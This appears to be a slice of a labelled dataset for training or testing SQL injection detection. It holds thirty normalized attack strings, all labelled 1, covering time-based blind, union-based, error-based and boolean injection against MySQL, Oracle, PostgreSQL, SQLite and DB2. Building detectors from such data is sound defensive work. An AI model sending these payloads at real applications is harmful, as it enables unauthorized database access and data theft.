row_index,payload_norm,label,sqli_type_hint
7320,"1 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
7321,"1%' ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( '%' = '",1,
7322,( 7098 = 7098 and sleep ( 5 ) ),1,
7323,"1"" ) as jiyl where 4893 = 4893 union all select null,null,null,null,null#",1,
7324,-3243 or 2266 = 3583#,1,
7325,"1' ) union all select null,null,null,null,null--",1,
7326,"1%"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""%"" = """,1,
7327,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'pphf' = 'pphf",1,
7328,"1"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""bxct"" like ""bxct",1,
7329,-9120' ) ) or 8571 = 8571--,1,
7330,1'+ ( select naiw where 4924 = 4924,1,
7331,-9389' ) or 8859 = 3989--,1,
7332,"-9923%' ) ) ) union all select 8985,8985,8985,8985,8985,8985,8985#",1,
7333,1' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'hbwk' like 'hbwk,1,
7334,"1"" ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ""tgdu"" = ""tgdu",1,
7335,"-1510' ) ) ) union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1,
7336,"1"" ) union all select null,null,null,null,null,null,null#",1,
7337,"elt ( 8192 = 8192,sleep ( 5 ) )",1,
7338,end and ( ( 'zeyr' = 'zeyr,1,
7339,"1"" ) ) as luon where 4676 = 4676 rlike sleep ( 5 ) #",1,
7340,"1"" ) where 6138 = 6138 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1,
7341,"1"" where 3740 = 3740 rlike sleep ( 5 ) #",1,
7342,"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'kgdt' like 'kgdt",1,
7343,1 ) as tngy where 8956 = 8956 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,1,
7344,"-4230"" ) ) ) union all select 6962,6962,6962,6962,6962,6962#",1,
7345,-3540 where 7302 = 7302 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,
7346,"1 ) as lfra where 2669 = 2669 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1,
7347,1' ) rlike sleep ( 5 ) and ( 'qsub' like 'qsub,1,
7348,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null--",1,
7349,"1'+ ( select 'uzaw' where 9900 = 9900 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",1,
